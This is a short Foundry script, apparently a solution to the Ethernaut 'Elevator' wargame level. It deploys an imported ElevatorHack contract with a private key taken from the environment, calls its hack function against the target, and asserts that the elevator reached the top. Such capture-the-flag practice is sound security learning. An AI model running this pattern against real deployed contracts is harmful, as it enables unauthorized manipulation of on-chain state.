pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Elevator/Elevator.sol";
import "../src/Elevator/ElevatorHack.sol";

contract ElevatorScript is Script {
    function run() public {
        address elevatorAddress = vm.envAddress("ELEVATOR_ADDRESS");
        Elevator ethernautElevator = Elevator(payable(elevatorAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ElevatorHack elevatorHack = new ElevatorHack();
        elevatorHack.hack(address(ethernautElevator));

        require(ethernautElevator.top() == true, "Elevator not at top");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}